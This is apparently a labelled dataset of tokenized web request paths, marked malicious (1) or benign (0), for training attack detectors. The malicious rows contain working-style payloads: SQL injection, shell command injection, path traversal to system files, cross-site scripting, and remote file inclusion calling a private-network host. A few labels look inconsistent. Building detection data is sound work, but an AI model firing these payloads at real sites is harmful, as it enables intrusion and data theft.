request	label
/ examples / jsp / checkbox / kb . cgi ? view =  '  & lang = en 	1
/ scripts / msmmask . exe ? mask =  / nessus893655960 . asp 	1
/ iis5fixes / 	0
/ admin . php ? cal_dir = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ? 	0
/ javascript /  . passwd . ini 	1
/ sttmnts / 	0
/ features_header2 / 	0
/ 20031022-13 / 	0
/ string / strings / parameters = '  ; echo $ ifsxqahul $  (  ( 9 + 99 )  )  $  ( echo $ ifsxqahul ) xqahul ' 	1
/ javascript / portals . exe 	1
/ javascript / 01 . html 	0
"/ string / strings / parameters = < head >  < meta http-equiv =  ""  "" content-type ""  ""  content =  ""  "" text / html ;  charset = utf-7 ""  ""  >   <  / head >  + adw-script + ad4-alert (  ' crosssitescripting '  )  ;  + adw- / script + ad4- "	1
/ main . php ? logout =  '  \ x0auname  > q64819443  # 	1
/ string / strings / parameters = 12noc567me2te 	0
/ 20051105-3 / 	0
/ string / strings / parameters = c /  la haya ,  109 13-d 	0
/ 1167012266 / 	0
/ cgi-bin / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category / 	1
/ string / strings / parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ thirddraft / 	0
/ interconnection / 	0
/ javascript / foo . shtml 	0
/ 1180292655 / 	0
/ javascript / chrome . exe 	1
/ string / strings / parameters = ruano barril 	0
/ javascript / wwwroot . part 	0
/ 134037 / 	0
"/ quagynka . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / esales . exe 	1
"/ string / strings / parameters = 1 ""  ""  )  as tecq where 4817 = 4817 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- "	1
/ string / strings / parameters = < marquee loop = 1 width = 0 onfinish = confirm ( 1 )  > 0 <  / marquee > 	1
/ string / strings / parameters = 35868151l 	0
/ string / str =  $  ( echo tikhvb )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ summit-americas / 	0
/ scripts / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ string / strings / parameters = 1 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  viti 	1
/ javascript / right . php3 	0
/ dvdcloner4 / 	0
/ en-us / s7qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ hyattbaltimore / 	0
/ string / strings / parameters = 1 '  ,  ( select  *  from generate_series ( 5609 , 5609 , case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 ) 	1
/ string / strings / parameters = echo lbgscb $  (  ( 75 + 53 )  )  $  ( echo lbgscb ) lbgscb & 	1
/ string / modo = entrar & login = merriell & pwd = adapuesto & remember = on & b1 = entrar 	0
/ 709562 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ 000_02 / 	0
/ string / strings / parameters = 03600 	0
"/ read / search / results ? words = nessus ""  >  < script > alert (  ' listmanager_words_xss . nasl '  )  <  / script > "	1
/ string / strings / parameters = 1 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  ) 	1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ string / strings / parameters = furnari pentinat 	0
/ string / strings / parameters = c /  salgueiral ,  198 	0
/ string / strings / parameters = otalora fortiana 	0
/ string / strings / parameters = 5331 	0
/ string / strings / parameters = |   [  6 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = buenache de la sierra 	0
/ 116606 / 	0
/ mappy-iti_thumb / 	0
/ string / modo = insertar & precio = 8316 & b1 = pasar + por + caja 	0
/ encryption1 / 	0
/ string / strings / parameters = abondadamente 	0
/ scripts / index . php ? p =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini \ x00 	1
"/ help . php ? q =  "" del \ x09q83132484 & rem \ x09 "	1
/ tbcbeta / 	0
/ scripts / news . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ? 	1
/ string / strings / parameters = 6egas0a 	0
"/ string / strings / parameters = 1 ""  ""  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  ) "	1
"/ string / strings / parameters = 1 %  ""  ""  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ""  ""  %  ""  ""  =  ""  "" "	1
/ accomdetails / 	0
/ help . php ? q = ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ; 	1
/ string / strings / parameters = 57476315m 	0
/ javascript / api . sql 	0
/ javascript / eric . asmx 	0
/ string / strings / parameters = calle codigo correspondencia oficial correos-telegrafos 33 	0
/ string / strings / parameters = 3051 	0
/ javascript / patches . tar 	0
/ string / strings / parameters = 1 '  ,  ( select  ( case when  ( 6560 = 2813 )  then 1 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual ) 	1
/ string / strings / parameters = & echo $ ifsutudjc $  (  ( 16 + 78 )  )  $  ( echo $ ifsutudjc ) utudjc /  / 	1
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  .  /  { file } 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kigxdw )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ files / message-forward . php3 ? bsx_libdir = xxpathxx 	1
/ aquazone / 	0
/ javascript / environment . tar . bz2 	0
/ en-us / account / backend / classes . php ? include_path =  .  .  / lib / jinzora . js \ x00 	1
/ string / strings / parameters = 1 '  )  )  )  union all select null , null -- 	1
/ javascript / win32 . tar . bz2 	0
/ cgi-bin / quickstore . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html & cart_id = 	1
"/ popup . php ? poll_ident =  < script > alert (  "" wvs-xss-magic-string-411445575285 ""  )  <  / script > "	1
/ keurmerklogo / 	0
/ javascript / war . svn-base 	0
/ string / modo = entrar & login = winnipeg & pwd = veh327lo & remember = on & b1 = entrar 	0
/ string / strings / parameters = &  # 34 ;  &  # 62 ;  < h1 / onmouseover =  '  \ u0061lert ( 1 )  '  > 	1
/ string / strings / parameters = -3794 '  )  union all select 2485 , 2485 , 2485 , 2485 , 2485 -- 	1
/ javascript / crm . c 	0
/ amazingshowsfrom / 	0
/ 21insurance / 	0
/ string / strings / parameters = villafrechs 	0
/ string / strings / parameters = camino carabineros ,  10 	0
/ string / strings / parameters = equivalentemente 	0
/ string / strings / parameters = |   [  9 -ne  $  ( echo nykvkx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ string / modo = registro & login = ransell & password = 6_ocin & nombre = monserrat & apellidos = bosch + linares & email = ballou @ adondeir . mn & dni = 97428124d & direccion = c /  + virgen + de + la + almudena ,  + 61 + 12 ? c & ciudad = murero & cp = 41720 & provincia = granada & ntc = 5897112253257561 & b1 = registrar 	0
"/ weq93ppb . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ alertrightside / 	0
/ string / strings / parameters = 36839675t 	0
/ string / strings / parameters = 2589 	0
/ fisherman-sandals / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- "	1
/ nsf07012 / 	0
/ string / strings / parameters = 1 )  )  as nwyh where 7100 = 7100 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ moviemain / 	0
/ orangehrm / 	0
/ javascript / low . png 	0
/ usr / extensions / get_calendar . inc . php ? root_path = xxpathxx 	1
/ scewint07cat / 	0
/ cgis / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ zuihld5m . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ makulow / 	0
/ string / strings / parameters = buchko 	0
/ lib / classes / swift / mailer . php . old 	0
/ string / strings / parameters = -4557 or 6872 = 6872 --  kkte 	1
"/ en-us / hipkz026 . idc ?  < script > document . cookie =  "" testyrbs = 2855 ;  ""  <  / script > "	1
/ whitetreelotrposter / 	0
/ javascript / incoming . rb 	0
/ wbasham-50 / 	0
"/ string / strings / parameters = 1 ""  ""  )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  -- "	1
/ javascript / pm . exe 	1
/ eudirect / 	0
/ help . php ? q =  ; rm \ x09q81281166 \ x09 # 	1
/ 480406 / 	0
/ p2p . png 	0
/ javascript / intra . tgz 	0
"/ string / strings / parameters = < script src =  "" http :  &  # 47 ;  &  # 47 ; xss . rocks / xss . jpg ""  >  <  / script > "	1
/ string / modo = entrar & login = hrenyk & pwd = embozalar & remember = off & b1 = entrar 	0
/ string / strings / parameters = 1 %  '  and 7366 = 9197 # 	1
/ string / strings / parameters = 01449036j 	0
/ 1167761499 / 	0
"/ rpxyx07v . asp ?  < script > document . cookie =  "" testbnli = 1975 ;  ""  <  / script > "	1
/ 121106hs-hacker100x75 / 	0
/ string / strings / parameters = brunstin 	0
/ draganddrop / 	0
/ string / strings / parameters = 1 %  '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  ' 	1
"/ phpmyadmin / webappmon . exe ? ins = nowait & act = natping & sel =  "" 255 . 255 . 255 . 255  &  id &  "" "	1
/ string / strings / parameters = 91512497m 	0
/ index . php / 1 ' 	1
/ 1168283422 / 	0
/ string / strings / parameters = carricar 	0
/ string / strings / parameters = 1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ( 5099 = 5099 	1
"/ edv3mapy . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ r3le3om5 . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = -1059 ""  ""  )  union all select 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 # "	1
"/ d7ktpmcq . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ examples / jsp / colors / search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1 	1
/ javascript / mobile . sql 	0
/ prod_brochure09186a00801f0a72 / 	0
/ phpmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1358744507 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ 163991 / 	0
/ javascript / pem . jsf 	0
/ usmissions / 	0
/ string / strings / parameters = % oa ping -n 30 127 . 0 . 0 . 1 	1
/ netconnect / 	0
/ tk25103-loginmonitorbho_class / 	0
/ javascript / includes . log 	0
"/ oie504mr . dll ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ 16559935 / 	0
/ bulletnews / 	0
"/ help . php ? q =  ""  & rm \ xa0q59981564 & rem \ xa0 "	1
/ string / strings / parameters = -4108 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' tqjx '  =  ' tqjx 	1
/ ntpwebmin / 	0
/ string / strings / parameters = |   [  9 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ javascript / imgs . test 	0
/ 105181 / 	0
/ autoaccidentattorney_616 / 	0
/ 051408 / 	0
/ lindsay_lohan / 	0
/ string / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  (  ' ctbs '  like  ' ctbs 	1
/ viristuf / 	0
/ phpmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ d1921377d8352b2c982fa2e825416e7c / 	0
/ javascript / mms . ep 	0
/ string / strings / parameters = 1 %  '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  '  %  '  =  ' 	1
/ string / strings / parameters = 5447608087529874 	0
"/ 5qnlm5z2 . jsp ?  < meta http-equiv = set-cookie content =  "" testsixi = 8451 ""  > "	1
/ string / modo = registro & login = rodolphe & password = alfa71ta & nombre = amine & apellidos = arimany + aguila & email = rapaport . iloloubek @ ajuntamentbarcelona20 . com & dni = 35742173n & direccion = travesia + castilla ,  + 92 ,  + 5-g & ciudad = ortuella & cp = 43746 & provincia = teruel & ntc = 9845728819454113 & b1 = registrar 	0
/ string / strings / parameters = oluges ,  les 	0
/ layman / 	0
/ dentalconnect / 	0
/ string / strings / parameters = select  *  from information_schema . tables -- 	1
/ javascript / sink . png 	0
/ string / modo = insertar & precio = 1885 +  & b1 = pasar + por + caja 	1
/ payday_advance / 	0
/ paypal money maker best / 	0
/ 09fair / 	0
/ string / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ forum1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini 	1
/ binkie7 / 	0
/ d04945t / 	0
/ main . php ? logout =  '  \ x0arm \ x09q55586739 \ x09 # 	1
"/ string / strings / parameters = 1 ""  ""  )  as kuuf where 6908 = 6908 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp -- "	1
/ string / strings / parameters = 1 )  )  as krzi where 8727 = 8727 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ 20031015-6 / 	0
/ string / strings / parameters = |  | echo ovbfoe $  (  ( 46 + 36 )  )  $  ( echo ovbfoe ) ovbfoe & 	1
"/ string / strings / parameters = ""  | echo $ ifsytbsts $  (  ( 24 + 38 )  )  $  ( echo $ ifsytbsts ) ytbsts | "	1
/ string / modoa = registro & login = puglia & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar 	1
/ string / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
/ string / strings / parameters = pelle1 @ 906 . com . aq 	0
/ string / modo = entrar & login = rocio4 & pwd = acrecenta ! dora & remember = onany ?   set-cookie :  + tamper = 1041264011025374727 & b1 = entrar 	1
/ javascript /  . passwd . o 	1
/ string / strings / parameters = 1 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  #  huhw 	1
/ string / strings / parameters = carol7 @ faders . com . bi 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' kbvq '  where 9279 = 9279 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  ' 	1
/ string / strings / parameters = &  & echo ncexjg $  (  ( 72 + 12 )  )  $  ( echo ncexjg ) ncexjg /  / 	1
/ string / strings / parameters = ; echo $ ifsxltpvn $  (  ( 45 + 86 )  )  $  ( echo $ ifsxltpvn ) xltpvn \ 	1
/ w7v5o2vf . soap 	0
/ string / modo = registro & login = saibun & password = s9st6o & nombre = ddimo & apellidos = scardetta + huerta & email = villatios @ cpanelweb . ie & dni = 18995930t & direccion = calle + mariano + garcia ,  + s / n +  & ciudad = valpalmas & cp = 40171 & provincia = zamora & ntc = 6803792379658242 & b1 = registrar 	0
/ examples / jsp / checkbox / index . php ? cat_select =  < script > foo <  / script > 	1
/ string / strings / parameters = 17005940q 	0
/ javascript / 2004 . exe 	1
/ string / strings / parameters = -6095 '  )  or 6872 = 6872 and  (  ' bfwm '  like  ' bfwm 	1
/ 060507 / 	0
/ string / modo = registro & login = gould & password = hablistn & nombre = gina & apellidos = marmolejos & email = tindall-bourne @ pintandomucho . cg & dni = 06327548h & direccion = codigo + postal + para + tele + 5 ,  + 63 + 13g & ciudad = cabanelles & cp = 05230 & provincia = ciudad + real & ntc = 4108422495216222 & b1 = registrar 	0
/ javascript / addressbook . nsf 	0
/ string / id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 6 & b1 = aadir + al + carrito 	0
/ string / strings / parameters = & lt ; script src =  /  / xss . rocks /  . j > 	1
/ string / strings / parameters = < svg onclick = popup = 1 ;  > 	1
/ string / strings / parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ b39240511smallbiz / 	0
/ _w0qqlotrz1qqfcmdzlistingcategorylistqqfclz3qqfcoz1 / 	0
/ string / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ 046014 / 	0
/ children ' s / 	1
/ string / strings / parameters = |  | echo ihelyg $  (  ( 76 + 62 )  )  $  ( echo ihelyg ) ihelyg & 	1
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > ctdn "	1
/ string / strings / parameters = shakor 	0
/ javascript / jvm . log 	0
/ q84637493 	0
/ string / modo = insertar & precio = 5055 & b1 = confirmar 	0
/ javascript / sessions . exe 	1
/ string / strings / parameters = jaguin-woodridge @ cristinaleon . si 	0
/ scripts / mlog . html ? screen =  / etc / passwd 	1
/ string / strings / parameters = 77293077j 	0
/ virustotalf / 	0
/ 121802 / 	0
"/ 7u1pb2xi . nsf ?  < script > document . cookie =  "" testlwwz = 718 ;  ""  <  / script > "	1
/ string / strings / parameters = 70 	0
"/ string / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / strings / parameters = 1 '  )  order by 1 -- 	1
/ javascript / all-wcprops . dump 	0
/ cgi-bin / contrib / forms / evaluation / c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00 	1
"/ bl8sefdm . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ main . php ? stuff =  ""  & ver \ x09 > q95961944 & rem \ x09 "	1
/ string / strings / parameters = 58439631n 	0
/ string / strings / parameters = '  waitfor delay  ' 0 : 0 : 20 '   -- 	1
/ string / strings / parameters = '  ) print (  ` echo ehpkwp \ necho  $  (  ( 79 + 86 )  )  \ necho ehpkwp \ necho ehpkwp `  )  ;  /  / ehpkwp 	1
/ awstats_configdir / 	0
"/ string / strings / parameters = 1 ""  ""  where 8672 = 8672 union all select null , null # "	1
"/ string / strings / parameters = 1 ""  ""  )  as jiiq where 6847 = 6847 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 -- "	1
/ 113489 / 	0
/ 120406cdpm2 / 	0
/ scripts / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00 	1
/ javascript / surf . exe 	1
/ javascript / feeds . jhtml 	0
/ string / strings / parameters = '  or  ' 1 '  =  ' 1 '  -- 	1
/ support / include / open_form . php ? include_dir = xxpathxx ? cmd = pwd 	1
/ string / strings / parameters = 7219 	0
/ string / strings / parameters = 1 '  where 1272 = 1272 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  -- 	1
/ idframer v2 / 	0
/ string / modo = registro & login = fitch & password = libres29 & nombre = aramis & apellidos = bellmunt + callealt & email = frigola @ lesionesmusculares . tv +  & dni = 56967582d & direccion = plza .  + celso + negueruela ,  + 113 ,  +  & ciudad = pajares + de + los + oteros & cp = 18370 & provincia = lava & ntc = 6708069843609931 & b1 = registrar 	1
/ javascript / root . error 	0
/ attachment50 / 	0
/ contactpage / 	0
/ fcgi-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = ""  echo bzqfls $  (  ( 30 + 41 )  )  $  ( echo bzqfls ) bzqfls "" "	1
/ string / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi 	1
/ javascript / iisadmin . temp 	0
/ javascript / program . conf 	0
/ string / strings / parameters = 23591 	0
/ 1606365518 / 	0
"/ e9rx3ya4 . x ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ chat . php . 1 	0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / rymojltfjq0 +  >  +  / dev / null +  &  '  )  ;  function v 	1
/ string / strings / parameters = 30555153k 	0
/ string / strings / parameters = savino 	0
/ string / strings / parameters = vladimirov @ saludyfitness . br 	0
"/ string / strings / parameters = 1 %  ""  ""  waitfor delay  ' 0 : 0 : 5 '  -- "	1
"/ string / strings / parameters = 1 %  ""  ""  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ""  ""  %  ""  ""  =  ""  "" "	1
